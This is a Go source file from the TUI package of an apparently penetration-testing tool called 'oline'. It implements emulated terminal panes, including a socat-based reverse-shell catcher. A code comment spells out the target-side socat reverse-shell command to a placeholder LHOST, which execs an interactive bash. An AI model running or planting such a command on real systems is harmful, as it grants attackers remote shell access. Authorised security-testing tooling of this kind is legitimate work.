package tui

import (
	"context"
	"fmt"
	"strconv"
	"strings"

	tea "github.com/charmbracelet/bubbletea"
	uv "github.com/charmbracelet/ultraviolet"
	vt "github.com/charmbracelet/x/vt"

	"github.com/nihaal-prasad/oline/internal/core"
	"github.com/nihaal-prasad/oline/internal/sandbox"
)

// Fully terminal-emulated panes.
//
// A terminal pane runs a command inside the sandbox attached to a real PTY (see
// sandbox.Interactive / OpenTerminal) and renders it through a VT emulator
// (charmbracelet/x/vt), so vim, htop, less and anything else that drives the
// terminal work exactly as they would in a native terminal. Two entry points share
// all of this machinery:
//
//   - Ctrl-b T opens an interactive operator shell (`bash -li`, as root).
//   - Ctrl-b L opens a fully-emulated reverse-shell CATCHER: a socat listener bound
//     to the pane's own PTY, so when the target connects back the operator gets a
//     real interactive remote terminal right in the pane.
//
// Input model (tmux-style): while a terminal pane is focused every keystroke is
// translated to its raw VT bytes and written to the child; only Ctrl-b is held back
// as oline's prefix (Ctrl-b Ctrl-b sends a literal Ctrl-b). Output flows the other
// way: the backend streams the child's bytes into the emulator, which the pane
// renders cell by cell; the emulator's own replies (cursor reports, etc.) are piped
// back to the child.

// termState is one terminal pane's live state, keyed by a synthetic pane id.
type termState struct {
	id     core.AgentID
	emu    *vt.SafeEmulator
	sess   sandbox.PTYSession
	cols   int
	rows   int
	cancel context.CancelFunc
	title  string // short label shown in the pane header (e.g. "shell", "revshell :4444")
	closed bool
}

func (ts *termState) write(b []byte) {
	if ts != nil && ts.sess != nil && !ts.closed {
		_, _ = ts.sess.Write(b)
	}
}

// termWriter is the io.Writer the sandbox streams child output to: it feeds the VT
// emulator and nudges the Bubble Tea loop to repaint (coalesced via a size-1 chan).
type termWriter struct {
	emu *vt.SafeEmulator
	ch  chan core.AgentID
	id  core.AgentID
}

func (w *termWriter) Write(p []byte) (int, error) {
	n, err := w.emu.Write(p)
	select {
	case w.ch <- w.id:
	default: // a repaint is already queued; it will render the latest state
	}
	return n, err
}

// termRepaintMsg asks the Bubble Tea loop to re-render (a terminal pane produced
// output). The View re-render reads the emulator's current state directly.
type termRepaintMsg core.AgentID

func listenTerm(ch chan core.AgentID) tea.Cmd {
	return func() tea.Msg { return termRepaintMsg(<-ch) }
}

// applyTermRepaint exists so the Update loop has something to call; the actual
// repaint is the View pass that follows every Update.
func (m *model) applyTermRepaint(core.AgentID) {}

// focusTerm returns the terminal state of the focused pane, or nil.
func (m *model) focusTerm() *termState {
	if m.focusPane == nil || !m.focusPane.term {
		return nil
	}
	return m.terms[m.focusPane.agent]
}

// termIDsSorted returns the live terminal ids in the order they were opened.
func (m *model) termIDsSorted() []core.AgentID {
	var out []core.AgentID
	for i := 1; i <= m.termSeq; i++ {
		id := core.AgentID(fmt.Sprintf("Term#%d", i))
		if _, ok := m.terms[id]; ok {
			out = append(out, id)
		}
	}
	return out
}

// focusTermByID jumps focus to the pane showing terminal id, switching window if it
// lives in another one.
func (m *model) focusTermByID(id core.AgentID) {
	m.saveWindow()
	for wi, w := range m.windows {
		for _, l := range leaves(w.root) {
			if l.term && l.agent == id {
				m.activateWindow(wi)
				m.focusPane = l
				m.saveWindow()
				m.relayout()
				m.status = "focused " + string(id)
				return
			}
		}
	}
}

// openTermPane opens an interactive operator shell in a fully-emulated terminal
// (Ctrl-b T). It runs as root, like the line-oriented shell pane.
func (m *model) openTermPane() {
	m.termSeq++
	id := core.AgentID(fmt.Sprintf("Term#%d", m.termSeq))
	m.openTermWith(id, []string{"bash", "-li"}, sandbox.Privileged, "shell")
}

// openRevTermPane opens a fully-emulated reverse-shell catcher: a socat listener
// tied to the pane's own PTY. When the target connects back (e.g. with
// `socat tcp:LHOST:port exec:'bash -li',pty,stderr,setsid,sigint,sane`) the operator
// gets a real interactive terminal. Needs socat in the sandbox (pentester mode
// best-effort installs it at startup — see ensureSocat).
func (m *model) openRevTermPane(port int) {
	m.termSeq++
	id := core.AgentID(fmt.Sprintf("Term#%d", m.termSeq))
	cmd := fmt.Sprintf("echo '[oline] waiting for a reverse shell on port %d (full PTY)…'; socat file:$(tty),raw,echo=0 tcp-listen:%d,reuseaddr", port, port)
	m.openTermWith(id, []string{"bash", "-lc", cmd}, sandbox.Privileged, fmt.Sprintf("revshell :%d", port))
}

// openTermWith opens a terminal running argv under a PTY: it splits the focused
// pane on a Shell tab (or in customizable mode), or opens a fresh Shell tab when the
// current tab (Info / Subagents) can't hold command panes.
func (m *model) openTermWith(id core.AgentID, argv []string, policy sandbox.EgressPolicy, title string) {
	if m.paneRoot == nil || m.focusPane == nil {
		return
	}
	if m.sess == nil || m.sess.Sandbox == nil {
		m.status = "no sandbox attached"
		return
	}
	inter, ok := m.sess.Sandbox.(sandbox.Interactive)
	if !ok {
		m.status = "this sandbox backend has no PTY support — use Ctrl-b $ for a line shell"
		return
	}
	if m.terms == nil {
		m.terms = map[core.AgentID]*termState{}
	}
	if m.termCh == nil {
		m.termCh = make(chan core.AgentID, 1)
	}

	// Place the pane first so the layout gives it a size to open the PTY at. From a
	// non-Shell tab (Info / Subagents), open the terminal in a fresh Shell tab rather
	// than splitting a tab that can't hold command panes; otherwise split the focus.
	leaf := newTermLeaf(id)
	prevWin := m.winIdx
	newTab := m.needNewCommandTab()
	if newTab {
		m.openLeafInNewShellTab(leaf) // saves the prior tab, activates the new one, relayouts
	} else {
		// paneRoot/focusPane were already nil-checked at the top and nothing above
		// changed them, so no re-check is needed here.
		m.zoom = false
		m.paneRoot, m.focusPane = splitPaneWith(m.paneRoot, m.focusPane, splitV, leaf)
		m.relayout()
	}
	cols, rows := termSize(leaf)

	emu := vt.NewSafeEmulator(cols, rows)
	ctx, cancel := context.WithCancel(context.Background())
	out := &termWriter{emu: emu, ch: m.termCh, id: id}
	sess, err := inter.OpenTerminal(ctx, core.AgentID("User"), sandbox.Cmd{Argv: argv, Policy: policy}, rows, cols, out)
	if err != nil {
		cancel()
		if newTab {
			// Drop the just-created empty Shell tab and return to the prior one.
			m.windows = m.windows[:len(m.windows)-1]
			m.activateWindow(prevWin)
		} else {
			m.paneRoot, m.focusPane = closePane(m.paneRoot, leaf)
			m.relayout()
		}
		m.status = "could not open terminal: " + err.Error()
		return
	}
	ts := &termState{id: id, emu: emu, sess: sess, cols: cols, rows: rows, cancel: cancel, title: title}
	m.terms[id] = ts

	// Pipe the emulator's own replies (cursor-position reports, device attributes,
	// in-band resize) back to the child's stdin. Ends when either side closes.
	go func() { _, _ = copyEmu(sess, emu) }()

	m.status = "opened terminal pane (" + string(id) + ") — Ctrl-b is the prefix; Ctrl-b Ctrl-b sends a literal Ctrl-b"
}

// copyEmu forwards the emulator's response stream to the PTY until EOF.
func copyEmu(dst sandbox.PTYSession, emu *vt.SafeEmulator) (int64, error) {
	buf := make([]byte, 4096)
	var total int64
	for {
		n, err := emu.Read(buf)
		if n > 0 {
			if _, werr := dst.Write(buf[:n]); werr != nil {
				return total, werr
			}
			total += int64(n)
		}
		if err != nil {
			return total, err
		}
	}
}

// termSize returns the emulator cell size (cols, rows) for a pane leaf: the inner
// area minus the one-line header.
func termSize(p *pane) (cols, rows int) {
	cols = p.w - 2
	rows = p.h - 2 - 1 // border (2) + header (1)
	if cols < 1 {
		cols = 1
	}
	if rows < 1 {
		rows = 1
	}
	return cols, rows
}

// startListenInput begins reverse-shell-catcher port entry on the command line.
func (m *model) startListenInput() {
	if m.sess == nil || m.sess.Sandbox == nil {
		m.status = "no sandbox attached"
		return
	}
	if _, ok := m.sess.Sandbox.(sandbox.Interactive); !ok {
		m.status = "this sandbox backend has no PTY support"
		return
	}
	m.listenInput = true
	m.input.SetValue("")
	m.status = "reverse-shell catcher: enter a TCP port to listen on · Esc cancels"
}

// applyListenInput consumes the entered port and opens a catcher terminal.
func (m *model) applyListenInput() {
	m.listenInput = false
	v := strings.TrimSpace(m.input.Value())
	m.input.SetValue("")
	port, err := strconv.Atoi(v)
	if err != nil || port < 1 || port > 65535 {
		m.status = "invalid port (want 1-65535): " + v
		return
	}
	m.openRevTermPane(port)
}

// reapTerm tears down a terminal pane's PTY session when the pane or its window
// closes, and forgets its bookkeeping.
func (m *model) reapTerm(p *pane) {
	if p == nil || !p.term {
		return
	}
	if ts := m.terms[p.agent]; ts != nil {
		ts.closed = true
		if ts.sess != nil {
			_ = ts.sess.Close()
		}
		if ts.cancel != nil {
			ts.cancel()
		}
		if ts.emu != nil {
			_ = ts.emu.Close() // unblocks the copyEmu response-pump goroutine (emu.Read -> EOF)
		}
		delete(m.terms, p.agent)
	}
	delete(m.transcripts, p.agent)
	delete(m.states, p.agent)
	delete(m.dirty, p.agent)
	for i, id := range m.order {
		if id == p.agent {
			m.order = append(m.order[:i], m.order[i+1:]...)
			break
		}
	}
}

// renderTerm renders a terminal pane's emulator screen into a cols x rows block,
// resizing the emulator/PTY first if the pane size changed. The cursor cell is shown
// in reverse video when the pane is focused.
func (m *model) renderTerm(p *pane, cols, rows int, focused bool) string {
	ts := m.terms[p.agent]
	if ts == nil || cols < 1 || rows < 1 {
		return strings.Repeat("\n", max(0, rows-1))
	}
	m.syncTermSize(ts, cols, rows)

	cur := ts.emu.CursorPosition()
	hideCur := ts.emu.CursorHidden()
	var b strings.Builder
	for y := 0; y < rows; y++ {
		for x := 0; x < cols; {
			cell := ts.emu.CellAt(x, y)
			content := " "
			w := 1
			var st uv.Style
			if cell != nil {
				if cell.Content != "" {
					content = cell.Content
				}
				if cell.Width > 0 {
					w = cell.Width
				}
				st = cell.Style
			}
			if w == 2 && x+2 > cols { // a wide cell that would overflow the row
				content, w = " ", 1
			}
			if focused && !hideCur && x == cur.X && y == cur.Y {
				st.Attrs ^= uv.AttrReverse // block cursor
			}
			b.WriteString(st.Styled(content))
			x += w
		}
		if y < rows-1 {
			b.WriteByte('\n')
		}
	}
	return b.String()
}

// syncTermSize resizes the emulator and the guest PTY when the pane's cell size
// changes (the QEMU backend applies it live; WSL's size is fixed at open).
func (m *model) syncTermSize(ts *termState, cols, rows int) {
	if ts.cols == cols && ts.rows == rows {
		return
	}
	ts.cols, ts.rows = cols, rows
	ts.emu.Resize(cols, rows)
	if ts.sess != nil {
		_ = ts.sess.Resize(rows, cols)
	}
}

// keyToBytes translates a Bubble Tea key event into the raw byte sequence a real
// terminal would deliver to the child (so arrows, Ctrl combos, function-ish keys and
// UTF-8 text all reach the PTY). Returns nil for keys with no terminal encoding.
func keyToBytes(msg tea.KeyMsg) []byte {
	var b []byte
	switch msg.Type {
	case tea.KeyRunes:
		b = []byte(string(msg.Runes))
	case tea.KeySpace:
		b = []byte(" ")
	case tea.KeyEnter:
		b = []byte("\r")
	case tea.KeyTab:
		b = []byte("\t")
	case tea.KeyShiftTab:
		b = []byte("\x1b[Z")
	case tea.KeyBackspace:
		b = []byte("\x7f")
	case tea.KeyEsc:
		b = []byte("\x1b")
	case tea.KeyUp:
		b = []byte("\x1b[A")
	case tea.KeyDown:
		b = []byte("\x1b[B")
	case tea.KeyRight:
		b = []byte("\x1b[C")
	case tea.KeyLeft:
		b = []byte("\x1b[D")
	case tea.KeyHome:
		b = []byte("\x1b[H")
	case tea.KeyEnd:
		b = []byte("\x1b[F")
	case tea.KeyPgUp:
		b = []byte("\x1b[5~")
	case tea.KeyPgDown:
		b = []byte("\x1b[6~")
	case tea.KeyDelete:
		b = []byte("\x1b[3~")
	case tea.KeyInsert:
		b = []byte("\x1b[2~")
	case tea.KeyCtrlAt: // Ctrl-@ / Ctrl-Space -> NUL
		b = []byte{0x00}
	case tea.KeyCtrlBackslash:
		b = []byte{0x1c}
	case tea.KeyCtrlCloseBracket:
		b = []byte{0x1d}
	case tea.KeyCtrlCaret:
		b = []byte{0x1e}
	case tea.KeyCtrlUnderscore:
		b = []byte{0x1f}
	default:
		// The Ctrl-A..Ctrl-Z key types ARE their ASCII control codes (1..26), so a
		// control key with no named case above maps straight to its byte.
		if t := int(msg.Type); t >= 1 && t <= 26 {
			b = []byte{byte(t)}
		}
	}
	if b == nil {
		return nil
	}
	if msg.Alt {
		b = append([]byte{0x1b}, b...) // Alt = ESC prefix
	}
	return b
}
